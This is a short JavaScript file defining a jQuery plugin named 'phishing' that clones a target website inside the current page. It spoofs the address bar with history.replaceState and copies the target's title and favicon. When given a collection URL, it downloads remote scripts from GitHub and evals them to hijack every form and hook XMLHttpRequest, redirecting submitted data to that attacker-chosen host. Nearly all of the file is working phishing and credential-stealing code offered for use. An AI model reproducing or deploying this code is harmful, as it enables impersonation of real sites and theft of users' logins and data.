(function(){
  $ = jQuery;
  $.phishing = function(url,receive_url,onload){
    if(typeof receive_url === 'function'){
      onload = receive_url;
      receive_url = void(0);
    }
    var get_link = (url=>{
      var link = document.createElement('a');
      link.href = url;
      return link;
    });
    var target = get_link(url);
    var is_origin = target.hostname==location.hostname;
    $.get(is_origin?url:`https://jsonp.afeld.me/?url=${encodeURIComponent(target.href)}`,data=>{
      history.replaceState('','',`${location.protocol}//${location.host}${target.pathname}${target.search}${target.hash}`);
      if(/<head.*>/i.test(data)){
        data = data.replace(/<head.*>/i,`
          <head>
            <base href="${target.protocol}//${target.host}/">
        `);
      }else{
        data = `<base href="${target.protocol}//${target.host}/">${data}`;
      }
      if(document.write.toString().indexOf('[native code]')==-1){
        var doc = document.implementation.createHTMLDocument();
        document.write = doc.write;
        document.open = doc.open;
        document.close = doc.close;
      }
      document.open();
      document.write(data);
      document.close();
      if(/<title/i.test(data)){
        document.title = data.match(/<title\s*.*>([\w|\W]*)<\/title>/mi)[1];
      }else{
        document.title = target.hostname;
      }
      $('head').append(`<link rel="shortcut icon" href="${target.protocol}//${target.host}/favicon.ico">`);
      if(receive_url){
        //hijack <form>
        $.get('https://raw.githubusercontent.com/jackmasa/jQuery.xform/master/jquery.xssform.js',data=>{
          setInterval(()=>{
            eval(data);
            $('form').each((i,f)=>{
              if(get_link(f.action).hostname!=get_link(receive_url).hostname){
                $(f).xform(receive_url);
              }
            });
          },1000);
        });
        //hook XMLHttpRequest
        $.get('https://raw.githubusercontent.com/jackmasa/captureXHR/master/captureXHR.js',data=>{
          eval(data);
          captureXHR(receive_url);
          onload && setTimeout(onload,233);
        });
      }else{
        onload && setTimeout(onload,233);
      }
    });
  };
})();
